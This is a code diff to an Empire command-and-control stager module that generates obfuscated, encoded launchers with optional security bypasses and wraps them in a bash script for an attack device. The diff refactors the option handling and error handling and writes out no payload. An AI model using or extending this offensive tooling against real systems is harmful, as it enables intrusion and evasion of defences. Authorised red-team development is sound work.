@@ -1,8 +1,4 @@
-import logging
-
-from empire.server.common import helpers
-
-log = logging.getLogger(__name__)
+from empire.server.core.exceptions import StagerGenerationException
 
 
 class Stager:
@@ -38,9 +34,7 @@ class Stager:
                 "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for "
                 "obfuscation types.",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
                 "DependsOn": [{"name": "Language", "values": ["powershell"]}],
             },
             "ObfuscateCommand": {
@@ -56,6 +50,7 @@ class Stager:
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
                 "Value": "",
+                "BypassLanguage": "powershell",
             },
             "Language": {
                 "Description": "Language of the stager to generate.",
@@ -76,11 +71,6 @@ class Stager:
                 "Value": "powershell",
                 "SuggestedValues": ["powershell", "cmd"],
                 "Strict": True,
-            },
-            "StagerRetries": {
-                "Description": "Times for the stager to retry connecting.",
-                "Required": False,
-                "Value": "0",
             },
             "OutFile": {
                 "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
@@ -118,9 +108,8 @@ class Stager:
         user_agent = self.options["UserAgent"]["Value"]
         proxy = self.options["Proxy"]["Value"]
         proxy_creds = self.options["ProxyCreds"]["Value"]
-        stager_retries = self.options["StagerRetries"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
-        if self.options["Obfuscate"]["Value"].lower == "true":
+        if self.options["Obfuscate"]["Value"]:
             obfuscate_script = True
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
 
@@ -135,32 +124,20 @@ class Stager:
                 user_agent=user_agent,
                 proxy=proxy,
                 proxy_creds=proxy_creds,
-                stager_retries=stager_retries,
                 bypasses=bypasses,
             )
         elif language in ["csharp", "ironpython"]:
-            if (
-                self.mainMenu.listenersv2.get_active_listener_by_name(
-                    listener_name
-                ).info["Name"]
-                != "HTTP[S]"
-            ):
-                log.error(
-                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
-                )
-                return ""
-
-            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
+            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner_routed(
                 language=language,
                 obfuscate=obfuscate_script,
                 obfuscation_command=obfuscate_command,
                 encode=True,
                 listener_name=listener_name,
+                bypasses=bypasses,
             )
 
-        if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
-            return ""
+        if not launcher:
+            raise StagerGenerationException("Error in launcher command generation.")
 
         enc = launcher.split(" ")[-1]
         bunny_code = "#!/bin/bash\n"
